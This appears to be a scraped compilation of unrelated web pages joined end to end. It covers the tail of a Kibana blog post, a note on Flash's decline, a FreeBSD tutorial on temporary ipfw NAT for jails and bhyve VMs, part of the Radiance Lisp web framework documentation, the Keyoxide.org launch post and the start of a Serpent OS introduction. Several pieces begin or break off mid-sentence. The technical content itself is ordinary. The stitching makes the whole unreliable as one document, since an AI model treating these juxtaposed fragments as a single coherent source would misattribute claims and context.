</p><p><img src="https://play.vidyard.com/WeKZ5mfwug3ng8gDPjSZgE.jpg" data-uuid="WeKZ5mfwug3ng8gDPjSZgE" data-v="4" data-type="inline" data-autoplay="1" data-loop="1" data-hidden_controls="1" data-muted="0" muted=""></p><p>But this is just the beginning. Developers at Elastic are now able to build features faster, more efficiently, and produce better code. For Kibana users, this translates to more features in every release! No matter which solutions you are using — <a href="https://www.elastic.co/enterprise-search">Elastic Enterprise Search</a>, <a href="https://www.elastic.co/observability">Observability</a>, or <a href="https://www.elastic.co/security">Security</a> — expect the capabilities to grow even faster.
</p> <p><strong><h2>Further reading for plugin developers</h2></strong></p><p>As we’ve rolled out these changes, we’ve introduced significant changes to our experimental plugin API available to non-Elastic plugin developers. If you are a developer that maintains a Kibana plugin, you will need to update your plugin to work with future versions of Kibana. Our incremental approach has led to churn in the experimental API and we generally recommend …</p></div></div></div></div></div>

          <p>Now it’s abandoned, but a lot of websites were built on FLASH technologies.</p>
          <p>Basic HTML technologies didn’t provide enough tools and methods for designers to express their ideas and FLASH which was used commonly to create an animation and interactive presentations stepped into the Web.</p>
          <p>For designers who wanted to do web — FLASH websites were the breath of fresh air. Everything you can imagine was possible — from complex interactive animations to 3D.</p>
          <p>The main source of inspiration was thefwa.com and it was an honor to add an FWA label on a website.</p>
          <p>Sounds good, right? But what happened with FLASH then? Well, briefly it wasn’t secure, it was heavy to load, Apple effect and HTML5.</p>
          <p>Unfortunately, I can’t provide any links to you, because you can’t open them, FLASH technology is deadly dead right now.</p>
          <p>It’s hard to imagine right now but FLASH was a big part of the internet not so far ago — websites, games, banners and I think that more than 50% of all designers portfolio was built on FLASH.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT
and a bridge interface. It will look something like this:</p>
<pre><code>         TO INTERNET
          ^
          |
          |
          v
          +-------+  192.168.1.x
+-------------| wlan0 |---------------+
|             +-------+               |
|                 ^                   |
|                 |                   |
|              ipfw nat               |
|                 |                   |
|                 V                   |
|            +---------+              |
| 10.0.4.1   | bridge0 |              |
|            +----+----+              |
|                 ^                   |
|                 | 10.0.4.0/24       |
|      ___________+_______________    |
|      |       |        |        |    |

|  | jail | |  vm  | | jail | | ...  ||
|  +------+ +------+ +------+ +------+|
+-------------- laptop ---------------+
</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

It should let you write personal websites and generally deployable applications easily and in such a way that they can be used on practically any setup without having to undergo special adaptations.</p> <h2 id="getting_it">Getting It</h2> <p>Radiance and associated modules and applications are distributed via Quicklisp in a separate dist. To install Radiance, do:</p> <pre><code>(ql-dist:install-dist "http://dist.tymoon.eu/shirakumo.txt")
(ql:quickload :radiance)
</code></pre> <p>From there on out you should be able to load and use any kind of Radiance module like <a href="https://github.com/Shirakumo/purplish">Purplish</a> directly via Quicklisp's <code>quickload</code>.</p> <h2 id="a_lengthy_and_in-depth_example">A Lengthy and In-Depth Example</h2> <p>You can find a tutorial that introduces Radiance and most of the important concepts, and explores how to write a web application in general, <a href="https://github.com/Shirakumo/radiance-tutorial/blob/master/Part%200.md">here</a>. It should give you a good feeling for how to go about things, and give you pointers about where to look if you need a particular feature. In the last part it'll also go into the actual setup and deployment of a Radiance installation on a production server.</p> <h2 id="a_simple_example">A Simple Example</h2> <p>The most basic thing you most likely want to do is serve some kind of HTML. So let's work towards that and gradually extend it. Before we can begin, we need to start up Radiance.</p> <pre><code>(ql:quickload :radiance)
(<a href="#FUNCTION%20RADIANCE-CORE%3ASTARTUP">radiance:startup</a>)</code></pre> <p>If this is your first time setting up Radiance, you'll get a note about it using the <code>r-welcome</code> module. It should also give you a link that you can open in your browser to see a little greeting page. For now we'll just want to put up our own little page alongside it.</p> <pre><code>(<a href="http://l1sp.org/cl/in-package">in-package</a> :rad-user)

(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (setf (<a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3A%28SETF%20CONTENT-TYPE%29">content-type</a> <a href="#VARIABLE%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a>) "text/plain") 
  "Hi!")</code></pre> <p>Visiting <a href="http://localhost:8080/example">localhost:8080/example</a> should now just show "Hi". Rather boring indeed. So let's spit out some HTML instead. For now, we'll use <a href="http://weitz.de/cl-who/">cl-who</a> since it is very simple.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page"))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>A recompile and refresh later and we have some font styling going on. Next we'll probably want to add a CSS file to it to style it properly. We could serve the CSS using another page as well, but that isn't the best way to go about things in the long term.</p> <p>Let's instead look at how to create a module, which will allow us to organise things in a more orderly fashion. You can create the files for a module manually, but for now we'll settle with an automatically generated skeleton that Radiance can provide you with.</p> <pre><code>(<a href="#FUNCTION%20RADIANCE-CORE%3ACREATE-MODULE">create-module</a> "example")</code></pre> <p>It should return you a path on which the module resides. It should contain an ASDF system, a main lisp file, and two folders, <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> and <code>template</code>. Surprisingly enough, the <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> folder is where statically served files go, and <code>template</code> is for template documents, if you happen to use a template system.</p> <p>Let's open up the <code>example.lisp</code> and carry over our example page from it.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page"))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>Pages are identified by a name symbol. Since we now have our own module, and thus our own package, the example symbol above won't be the same as the one we've used before. We'll just have to remove the page in the <code>rad-user</code> package to avoid the clash.</p> <pre><code>(<a href="#FUNCTION%20RADIANCE-CORE%3AREMOVE-PAGE">remove-page</a> 'rad-user::example)</code></pre> <p>Next let's create a simple CSS file to spruce things up a little. The file will be <code>example.css</code> placed in the <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> folder. Here's a sample CSS if you don't want to write your own.</p> <pre><code>body{
    font-family: sans-serif;
    font-size: 12pt;
    background: #EEE;
}

header{
    text-align: center;
}

main{
    width: 800px;
    margin: 0 auto 0 auto;
    background: #FFF;
    padding: 10px;
    border: 1px solid #BBB;
    border-radius: 5px;
}</code></pre> <p>Next we need to modify our HTML to actually link to the style sheet. In order to get the address to the stylesheet we'll have to make use of Radiance's routing system. Don't worry though, it's not much of a hassle.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page")
             (:link :rel "stylesheet" :type "text/css" 
                    :href (<a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a> "/static/example/example.css" :representation :external)))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>Refresh the page, and voilà, now it's got some pizzazz to it too. You'll probably want an explanation for the whole <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code> business. Explaining it in full is handled by the sections following this one, but the gist of it is that it ensures that the link to the static file is properly resolved under any setup.</p> <h2 id="1._radiance_concepts_&amp;_parts">1. Radiance Concepts &amp; Parts</h2> <h3 id="1.1_uri">1.1 URI</h3> <p>One of the most central concepts in Radiance is that of a URI. A URI is an object that consists of a list of domains, an optional port number, and a path (see <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>). It is essentially a stripped down version of a general URI, and as such doesn't include a schema, query, or fragment part. Another important difference is that the <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAINS">domains</a></code> URIs are used at several points throughout the framework, both to capture locations and to handle dispatch matching.</p> <p>Note that URIs are mutable. This is important for performance, as URI modifications have to happen in several parts that lie on the critical path. However, in the usual case it is not expected that URIs are modified outside of a few select functions. Modifying a URI's parts in unexpected ways may lead to strange behaviour.</p> <p>URIs have a unique string representation and can be serialised to string and parsed back into a full URI object again. URIs can also be dumped to FASL files as literals, so emitting them from macros is fine. The syntax for a URI is as follows:</p> <pre><code>URI     ::= DOMAINS? (':' PORT)? '/' PATH?
DOMAINS ::= DOMAIN ('.' DOMAIN)*
DOMAIN  ::= ('a'..'Z' | '0'..'9' | '-')
PORT    ::= ('0'..'9'){1, 5}
PATH    ::= .*</code></pre> <p>You can use <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code> to turn a URI into a concrete URL. Reversal, encoding, and proper formatting of all the parts is handled for you automatically there.</p> <p>See <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAINS">domains</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APORT">port</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APATH">path</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AMATCHER">matcher</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-STRING">uri-string</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMAKE-URI">make-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMAKE-URL">make-url</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AENSURE-URI">ensure-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOPY-URI">copy-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APARSE-URI">parse-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3C">uri&lt;</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3E">uri&gt;</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3D">uri=</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-MATCHES">uri-matches</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMERGE-URIS">merge-uris</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREPRESENT-URI">represent-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code>.</p> <h3 id="1.2_request_and_response">1.2 Request and Response</h3> <p>In order to encapsulate the data that is sent to  and from, we have the idea of a Request (<code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>) and Response (<code><a href="#CLASS%20RADIANCE-CORE%3ARESPONSE">response</a></code>) object. The Request object holds the URI that represents to which location the request goes, and all the data contained in the HTTP payload like post, get, header, and cookie variables. The Response object holds the return-code, headers, cookies, and the actual body data.</p> <p>During the processing of a request, these two objects must always be present and bound to the <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2AREQUEST%2A">*request*</a></code> and <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a></code> variables. They encapsulate a lot of very vital information that is necessary to generate dynamic pages. Additionally, the Request contains an opaque <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code> table in which you can store arbitrary data. This is useful when you need to exchange pieces of information between individual parts of the system that may be reached during the request execution.</p> <p>Requests don't necessarily have to come from the HTTP server. In order to test things you can also construct a request yourself and send it out programmatically. Whatever the case, the primary interface to dispatch a request is called <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>. This will construct a Request and Response object for you and appropriately handle the URI. If you want to do that yourself and <em>really</em> just send out a complete Request object, you can use <code><a href="#FUNCTION%20RADIANCE-CORE%3AEXECUTE-REQUEST">execute-request</a></code>.</p> <p>For the actual handling of a request, see dispatchers, pages, and API endpoints.</p> <p>See <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2AREQUEST%2A">*request*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEFAULT-EXTERNAL-FORMAT%2A">*default-external-format*</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEFAULT-CONTENT-TYPE%2A">*default-content-type*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHTTP-METHOD">http-method</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHEADERS">headers</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APOST-DATA">post-data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AGET-DATA">get-data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACOOKIES">cookies</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AUSER-AGENT">user-agent</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREFERER">referer</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAIN">domain</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AREMOTE">remote</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AISSUE-TIME">issue-time</a></code>, <code><a href="#CLASS%20RADIANCE-CORE%3ARESPONSE">response</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ARETURN-CODE">return-code</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACONTENT-TYPE">content-type</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AEXTERNAL-FORMAT">external-format</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHEADERS">headers</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACOOKIES">cookies</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE">cookie</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ANAME">name</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AVALUE">value</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAIN">domain</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APATH">path</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AEXPIRES">expires</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHTTP-ONLY">http-only</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ASECURE">secure</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE-HEADER">cookie-header</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE">cookie</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AGET-VAR">get-var</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APOST-VAR">post-var</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APOST%2FGET">post/get</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AHEADER">header</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AFILE">file</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREDIRECT">redirect</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ASERVE-FILE">serve-file</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST-RUN-TIME">request-run-time</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEBUGGER%2A">*debugger*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AHANDLE-CONDITION">handle-condition</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ARENDER-ERROR-PAGE">render-error-page</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AEXECUTE-REQUEST">execute-request</a></code>, <code>set-data</code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code></p> <h3 id="1.3_route">1.3 Route</h3> <p>Before a Request can be dispatched on, it goes through something called the routing system. Unlike in other frameworks, where 'routes' designate what handles a request, in Radiance a Route (<code><a href="#FUNCTION%20RADIANCE-CORE%3AROUTE">route</a></code>) is a form of URI translator. This part of the system is what's responsible for creating and upholding two "universes", an internal and an external one.</p> <p>The internal universe is the one actual web applications live in. The external universe is the one the HTTP server and a user of the website lives in. This distinction is necessary in order to allow you to, one one hand, write web applications without having to worry about what a potential setup on a server might look like at some point. You don't have to worry about what kind of domain, port, path setup may be necessary to run your application. On the other hand, it allows you, as a webadmin, to customise and run the system to your exact desires without fear of breaking things.</p> <p>This all is facilitated by routes, of which there are two kinds: mapping, and reversal routes. Mapping routes are responsible for turning a URI from the external universe into one of the internal universe. Usually this involves cutting away the top-level domain and perhaps doing a mapping of subdomains. Reversal routes do the opposite-- they go from the internal universe to the external. This is necessary in order to make links in your served pages refer to …</p></section></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, I'm excited to launch <a href="https://keyoxide.org/">Keyoxide.org</a>, the lightweight and FOSS solution to make basic cryptography operations accessible to regular humans.</p>
<h2>What is Keyoxide.org?</h2>
<p><a href="https://keyoxide.org/">Keyoxide.org</a> offers easy encryption, signature verification and decentralized identity proof verification based on PGP keys while demanding little in-depth knowledge about the underlying encryption program from its users.</p>
<p>This project aims to offer comparable functionality as services like <a href="https://keybase.io/">Keybase</a> while reducing friction and being more open.</p>
<p>The project is MIT licensed, uses <a href="https://github.com/openpgpjs/openpgpjs">openpgpjs</a> and is hosted on <a href="https://codeberg.org/yarmo/keyoxide">Codeberg</a>.</p>
<h2>Why only encryption and signature verification?</h2>
<p>These are the operations that are available when only having access to public keys instead of private keys. If you wish to decrypt messages and sign them, you need a keypair. If you have a keypair, you probably have the knowledge to use dedicated tools like the CLI or Kleopatra. And if you do, you probably won't be using <a href="https://keyoxide.org/">Keyoxide.org</a> directly yourself.</p>
<p>Indeed, if you possess a PGP keypair, <a href="https://keyoxide.org/">Keyoxide.org</a> is the tool you send to others to interact with your public key more easily. Allow them to encrypt a message for you, to verify one of your signatures, to verify your online identities using decentralized proofs.</p>
<h2>What are those decentralized identity proofs you keep mentioning?</h2>
<p>You know how Keybase allows you to prove you have control over accounts on certain websites and services? A great function! Fortunately for you, this function can be even better and more secure by using <a href="https://keyoxide.org/guides/openpgp-proofs">decentralized OpenPGP identity proofs</a>. <a href="https://keyoxide.org/">Keyoxide.org</a> will prove your identity on multiple platforms at the same time and yet, you are not required to make an account to use this function. How is that possible?</p>
<p>Well, it's called <em>decentralized</em> for a reason: <a href="https://keyoxide.org/">Keyoxide.org</a> doesn't hold your proofs, your key does! Any software that can access your public key can verify these proofs for anyone. When better tooling comes around, you could verify those proofs using a mobile app, using a command-line utility, you name it. No single service holds your proof, only you do, stored inside your keypair.</p>
<p>I have written a <a href="https://keyoxide.org/guides">guide</a> on how to add a proof for every platform currently supported by this website: <a href="https://keyoxide.org/guides/dns">domains</a>, <a href="https://keyoxide.org/guides/lobsters">Lobste.rs</a>, <a href="https://keyoxide.org/guides/twitter">Twitter</a>, <a href="https://keyoxide.org/guides/github">Github</a>, a <a href="https://keyoxide.org/guides">bunch more</a> and work is in progress to support even more still. Is your beloved service not in the list? <a href="https://codeberg.org/yarmo/keyoxide">Open an issue or make a PR</a>! Free open-source software FTW!</p>
<p>Oh, that reminds me, any <a href="https://keyoxide.org/guides/mastodon">Mastodon</a> instance can be used to prove your identity. Yes, <a href="https://github.com/keybase/keybase-issues/issues/3385">any</a>.</p>
<h2>So how does it compare to Keybase?</h2>
<p>There's a more complete <a href="https://keyoxide.org/guides/feature-comparison-keybase">guide on the Keyoxide website</a>, but in a nutshell:</p>
<ul>
<li>more privacy-friendly by not forcing you to create an account and handing over data</li>
<li>more secure by not asking you to trust the service with your private keys</li>
<li>open-source servers (<a href="https://github.com/keybase/client/issues/24105">a must</a>)</li>
<li>encrypt/verify with every public key accessible on the internet, not just those that have been uploaded to a proprietary server</li>
<li>almost all processing is done in the browser, no data is sent to servers*</li>
<li>no vendor lock-in</li>
<li>selfhostable</li>
</ul>
<p>* Only exception is decentralized identity proof verification: some service providers do not have the correct CORS headers (like Reddit) or require APIs (like Twitter). In these rare cases, simple PHP scripts (also open-source) run the proof verification instead.</p>
<h2>Can I get an account?</h2>
<p>No. <a href="https://keyoxide.org/">Keyoxide.org</a> doesn't need your data on its servers. There are already several ways of exposing public keys on the internet, including <a href="https://keyoxide.org/guides/web-key-directory">web key directory</a> (WKD) and dedicated servers like <a href="https://keys.openpgp.org/">keys.openpgp.org</a>. Let's use those instead of making yet another service where you need to upload your keys to.</p>
<h2>Can I get a profile page then?</h2>
<p>Yes! Append your PGP fingerprint or WKD id to the URL and there it is!</p>
<p>Want an example? Here's  my profile at<br>
<a href="https://keyoxide.org/9f0048ac0b23301e1f77e994909f6bd6f80f485d">https://keyoxide.org/9f0048ac0b23301e1f77e994909f6bd6f80f485d</a>.</p>
<p>Now you know what accounts on various services are mine, where to follow me if you wish to get updates on the project and if you wish to send me an encrypted message, that's also just two clicks away.</p>
<h2>What about my private keys?</h2>
<p>Don't upload your private keys to the internet, period. If a service wants your private keys on their (proprietary) servers, say no.</p>
<h2>You said selfhostable?</h2>
<p>Well, yes! It's not a fully supported use case just yet, but the browser does all the processing, the server is mostly just there to deliver the files to the user to perform the operations. <a href="https://codeberg.org/yarmo/keyoxide">Grab the code</a> and put it on your own PHP server!</p>
<h2>Any closing words?</h2>
<p>I built this to provide better tooling around modern-day encryption programs and reduce the friction for less tech-savvy people when interacting with public keys.</p>
<p>For those who wish to use encryption programs beyond OpenPGP, <a href="https://codeberg.org/yarmo/keyoxide/issues">let's talk about this</a>. Keyoxide doesn't have any reference to PGP in its name for a reason: it could serve as a platform for easy interaction with any public key, no matter the underlying encryption program.</p>
<p>And above all, I hope you see the same benefit and potential in <a href="https://keyoxide.org/">Keyoxide.org</a> as I do and would like to see it grow as an open and accessible platform to push forward the democratization of online privacy and security.</p>
<p>Privacy is not a luxury.</p>
<p>Many thanks to <a href="https://metacode.biz/@wiktor">Wiktor</a> for helping with the decentralized identity proofs.</p></div></div>]]>

    <div>
        <article>
            <p>Serpent OS is (or at least, will be) a Linux distribution with notably different goals
from the mainstream offering. We’re in the process of establishing the project, with
development properly starting towards the end of July.</p>
<h4 id="naming">Naming</h4>
<p>Eventually our plan is to rebrand as ‘Serpent Linux*’ - however we will first need to
complete some early donkey work and apply for a sublicense to use the name. As explained
below, this is <em>not</em> Serpent ‘GNU/Linux’ as the distribution will not be dependent on
a GNU toolchain or runtime. For those who are curious, we’re working with an artist to
choose an appropriate logo for the project.</p>
<h4 id="aims">Aims</h4>
<p>The vast majority of Linux distributions have highly similar goals, and can be best
described using these common industry buzzwords:</p>
<pre><code>Modern, lightweight, privacy oriented/respecting, user-friendly desktop
</code></pre>
<p>We’re focused on building a Linux distribution that serves our own needs.
